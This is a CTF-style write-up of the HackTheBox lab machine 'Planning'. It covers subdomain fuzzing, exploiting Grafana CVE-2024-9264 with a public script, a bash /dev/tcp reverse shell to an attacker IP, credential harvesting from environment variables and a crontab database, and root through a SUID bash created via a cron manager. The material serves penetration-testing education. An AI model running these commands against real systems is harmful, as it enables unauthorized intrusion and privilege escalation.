---
title: "HackTheBox - Planning"
author: Nasrallah
description: ""
date: 025-10-01 07:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, linux, easy, web, ssh, tunneling, cronjobs, cve, sqli, rce]
img_path: /assets/img/hackthebox/machines/planning
image:
    path: planning.png
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---

[Planning](https://app.hackthebox.com/machines/planning) is an easy difficulty Linux machine that features web enumeration, subdomain fuzzing, and exploitation of a vulnerable `Grafana` instance to [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264). After gaining initial access to a Docker container, an exposed password enables lateral movement to the host system due to password reuse. Finally, a custom cron management application with `root` privileges can be leveraged to achieve full system compromise.

Credentials provided for the box: `admin / 0D5oT70Fq13EvB5r`

## **Enumeration**

### nmap

We start an Nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.129.23.1                                                               
Host is up (0.52s latency).                                                                    
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION                                                                   
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:                                                                                 
|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)                 
|_  256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://planning.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.14 seconds
```

We have ssh on port 22 and nginx http serve on port 80 redirecting to the domain planning.htb, let's add that to /etc/hosts file.

### Web

Let's check the website on port 80.

![website](1.png)

Nothing looks interesting in the website. I'll run a subdomain scan using ffuf.

```terminal
ffufnames planning.htb -ac                                                            
                                                                                               
        /'___\  /'___\           /'___\                                                        
       /\ \__/ /\ \__/  __  __  /\ \__/                                                        
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/                                                       
         \ \_\   \ \_\  \ \____/  \ \_\                                                        
          \/_/    \/_/   \/___/    \/_/                                                        
                                                                                               
       v2.1.0-dev                              
________________________________________________                                               
                                                                                               
 :: Method           : GET                                                                     
 :: URL              : http://planning.htb                                                     
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/namelist.txt                    
 :: Header           : Host: FUZZ.planning.htb 
 :: Follow redirects : false                                                                   
 :: Calibration      : true                                                                    
 :: Timeout          : 10                                                                      
 :: Threads          : 40                                                                      
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500                                                                                                                   
________________________________________________                                               
                                                                                               
grafana                 [Status: 302, Size: 29, Words: 2, Lines: 3, Duration: 119ms]
```

Found `grafana`, I'll add that to my hosts file and navigate to it.

![grafana](2.png)

We got the login page of grafana, here we can use the credentials provided with the box to login.

![login](3.png)

## **Foothold**

The version of grafana is 11.0.0, searching that on google I found it vulnerable to SQL Injection that leads to file read and/or command execution [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264).

I'll use this [exploit](https://github.com/nollium/CVE-2024-9264) to get command execution.

```terminal
[★]$ python CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r http://grafana.planning.htb/ -c 'id'                                                 
[+] Logged in as admin:0D5oT70Fq13EvB5r
[+] Executing command: id
[+] Successfully ran duckdb query:
[+] SELECT 1;install shellfs from community;LOAD shellfs;SELECT * FROM read_csv('id >/tmp/grafana_cmd_output 2>&1 |'):
[+] Successfully ran duckdb query:
[+] SELECT content FROM read_blob('/tmp/grafana_cmd_output'):
uid=0(root) gid=0(root) groups=0(root)
```

For a reverse shell, I'll use the following command.

```bash
python CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r http://grafana.planning.htb/ -c 'bash -c "bash -i >& /dev/tcp/10.10.16.33/9001 0>&1"'
```

![revshell](4.png)

## **Privilege Escalation**

Checking the environment variable we find the password of user enzo.

```bash
root@7ce659d667d7:~/conf# env
AWS_AUTH_SESSION_DURATION=15m
HOSTNAME=7ce659d667d7
[SNIP]
GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
GF_SECURITY_ADMIN_USER=enzo
[SNIP]
```

We can use the password to ssh as user enzo.

```terminal
[★]$ ssh enzo@planning.htb 
enzo@planning.htb's password: 
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-59-generic x86_64)
[SNIP]
Last login: Tue Sep 30 11:06:24 2025 from 10.10.16.50
enzo@planning:~$ id
uid=1000(enzo) gid=1000(enzo) groups=1000(enzo)
```

Checking open ports using nestat we find port 8000 listening locally.

```terminal
enzo@planning:~$ netstat -tulpn
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:37729         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.54:53           0.0.0.0:*                           -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -   
```

Let's forward the port using ssh.

```terminal
ssh enzo@planning.htb -L 8000:127.0.0.1:8000
```

Now let's navigate to `127.0.0.1:8000`

![auth](5.png)

We got a prompt to authenticate, I tried the credentials we found so far but nothing worked.

Digging into the system I found a file at `/opt/crontabs/crontab.db` with credentials inside it.

```json
{"name":"Grafana backup","command":"/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz","schedule":"@daily","stopped":false,"timestamp":"Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740774983276,"saved":false,"_id":"GTI22PpoJNtRKg0W"}
{"name":"Cleanup","command":"/root/scripts/cleanup.sh","schedule":"* * * * *","stopped":false,"timestamp":"Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740849309992,"saved":false,"_id":"gNIRXh1WIc9K7BYX"}
```

I managed to login with `root:P4ssw0rdS0pRi0T3c`

![loggedin](6.png)

In this site we can create cronjob.

I'll create a cronjob that makes a copy of bash and give it SUID permissions.

```terminal
cp /bin/bash /tmp/bash && chmod +s /tmp/bash
```

![suid](7.png)

I'll save the cronjob and click run now to execute it and then check the /tmp directory.

![root](8.png)

The binary was created successfully, we run `/tmp/bash -p` to get a root shell.

## **References**

<https://nvd.nist.gov/vuln/detail/CVE-2024-9264>

<https://github.com/nollium/CVE-2024-9264>

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
